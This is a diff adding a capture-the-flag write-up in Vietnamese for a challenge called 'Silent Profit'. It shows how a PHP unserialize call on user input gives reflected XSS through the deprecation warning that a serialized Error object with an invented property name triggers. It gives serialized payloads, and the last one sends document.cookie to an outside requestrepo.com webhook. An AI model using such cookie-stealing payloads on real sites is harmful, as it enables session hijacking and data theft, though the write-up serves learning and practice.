@@ -60,7 +60,54 @@ require <<<_
 \57\146\154\141\147 # /flag
 _;
 ```
-
 <img width="839" height="632" alt="image" src="https://github.com/user-attachments/assets/c3b4b7ed-feaa-4249-b20c-f785efcebeff" />
+
+
+# Silent Profit
+Bài này là 1 bài XSS khá là lạ bởi vì ngoài code của con bot ra, web chính chỉ gồm 1 file php duy nhất với 2 dòng code :
+
+```php=
+<?php 
+show_source(__FILE__);
+unserialize($_GET['data']);
+```
+
+Và mình suy nghĩ ngay đến việc truyền vào thứ gì đó gây ra exception để có thể hiển thị lại những gì mình đã truyền vào bởi vì không có dòng `var_dump` hay `print_r` nào.
+
+Khi truyền vào 1 object bất kì hợp lệ thì sẽ không có gì cả
+<img width="672" height="139" alt="image" src="https://github.com/user-attachments/assets/15f2258a-05d4-42ab-8aca-c1cf7514bd2c" />
+
+
+Khi truyền vào object không hợp lệ trong cấu trúc serialize thì sẽ bị lỗi `Error at offset...`  nhưng không có bất kỳ thông tin nào reflect lại mà chúng ta có thể kiểm soát.
+<img width="724" height="165" alt="image" src="https://github.com/user-attachments/assets/0af1c826-aa1e-450b-bfc4-5c822542fce2" />
+
+
+Mình đã nghĩ tới việc sử dụng các built-in object của PHP. Class mình sử dụng ở đây là `Error` class
+<img width="636" height="685" alt="image" src="https://github.com/user-attachments/assets/880f422a-e562-4e62-ac35-f9cd8680e76d" />
+
+Mình thử truyền vào object như sau:
+```!
+O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:7:"perrito";s:2:"de";}
+```
+
+Đúng 1 số thuộc tính mà PHP xây dựng sẵn như `message`, `code`, `file` tuy nhiên có 1 thuộc tính nữa không được xây dựng (mình bịa ra) là `perrito`. Khi truyền vào sẽ gặp lỗi sau: 
+<img width="816" height="152" alt="image" src="https://github.com/user-attachments/assets/c0973777-7fe1-4ecc-ac87-7a639a4b517e" />
+
+
+`Deprecated: Creation of dynamic property Error::$perrito is deprecated in /var/www/html/index.php on line 3`
+
+Từ `perrito` đã được reflect lại trên đây. Rồi giờ mình thử chèn payload XSS vào xem sao:
+```!
+O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:21:"<svg/onload=alert(1)>";s:2:"de";}
+```
+<img width="893" height="303" alt="image" src="https://github.com/user-attachments/assets/9bb59a77-e5d8-4aea-98d8-1bebe0b671d5" />
+
+
+Alert đã xuất hiện, giờ chỉ cần thêm hàm fetch đến webhook rồi gửi cho bot thôi là xong!
+```!
+O:5:"Error":4:{s:7:"message";s:7:"deptrai";s:4:"code";i:0;s:4:"file";s:9:"index.php";s:77:"<svg/onload=fetch('https://9m42157q.requestrepo.com/?flag='+document.cookie)>";s:2:"de";}
+```
+<img width="957" height="678" alt="image" src="https://github.com/user-attachments/assets/d4bdd76b-c6fe-4bb3-a44e-b1a87dde43b5" />
+
 
 
